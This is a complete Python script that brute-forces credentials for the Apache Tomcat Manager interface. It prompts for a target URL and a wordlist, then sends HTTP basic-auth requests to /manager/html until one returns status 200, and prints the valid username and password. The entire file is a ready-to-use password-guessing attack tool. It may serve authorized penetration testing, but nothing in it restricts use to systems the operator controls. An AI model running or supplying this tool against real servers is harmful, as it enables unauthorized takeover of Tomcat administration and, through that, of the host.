#!/usr/bin/env python3

import sys
import requests
from colorama import Fore, Style, init

# Initialize colorama for cross-platform support
init(autoreset=True)

def main():
    # Prompt the user for the base URL
    base_url = input(f"{Fore.YELLOW}Enter the base URL (e.g., http://127.0.0.1:8080): {Style.RESET_ALL}").strip()
    full_url = f"{base_url}/manager/html"

    # Prompt the user for attack type
    print(f"{Fore.YELLOW}Select the type of attack:")
    print(f"1. Username and password combinations from a file (default)")
    print(f"2. Single username with a password list{Style.RESET_ALL}")
    attack_type = input(f"{Fore.YELLOW}Enter your choice (1/2): {Style.RESET_ALL}").strip() or "1"

    # If attack type 2, prompt for username
    username = None
    if attack_type == "2":
        username = input(f"{Fore.YELLOW}Enter the username to test (e.g., admin): {Style.RESET_ALL}").strip()

    # Prompt the user for the wordlist path
    wordlist_path = input(f"{Fore.YELLOW}Enter the path to the wordlist (e.g., tomcat-betterdefaultpasslist.txt): {Style.RESET_ALL}").strip()

    # Prompt the user for verbosity
    verbosity = input(f"{Fore.YELLOW}Enable verbosity? (yes/no): {Style.RESET_ALL}").strip().lower() == "yes"

    try:
        # Open the password file
        with open(wordlist_path, 'r') as f:
            for line in f:
                # Determine credentials based on attack type
                if attack_type == "1":
                    credentials = line.strip().split(":")
                    if len(credentials) != 2:
                        if verbosity:
                            print(f"{Fore.RED}Skipping malformed line: {line.strip()}{Style.RESET_ALL}")
                        continue
                    username, password = credentials[0], credentials[1]
                else:
                    # Use the fixed username with passwords from the file
                    password = line.strip()

                if verbosity:
                    print(f"{Fore.CYAN}Testing credentials: {username}:{password}{Style.RESET_ALL}")

                try:
                    # Make the request to Tomcat Manager
                    response = requests.get(full_url, auth=(username, password))
                    
                    # Check if the credentials are valid
                    if response.status_code == 200:
                        print(f"{Fore.GREEN}+++++ Found valid credentials: \"{username}:{password}\" +++++{Style.RESET_ALL}")
                        sys.exit(0)  # Exit the script with a success code
                except requests.RequestException as e:
                    # Handle any request errors gracefully
                    if verbosity:
                        print(f"{Fore.RED}Error occurred while testing credentials {username}:{password}: {e}{Style.RESET_ALL}")

        # If the loop completes without finding valid credentials
        print(f"{Fore.RED}No valid credentials found.{Style.RESET_ALL}")
        sys.exit(1)  # Exit the script with a failure code

    except FileNotFoundError:
        print(f"{Fore.RED}Wordlist file not found: {wordlist_path}{Style.RESET_ALL}")
        sys.exit(1)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Script interrupted by user.{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    main()
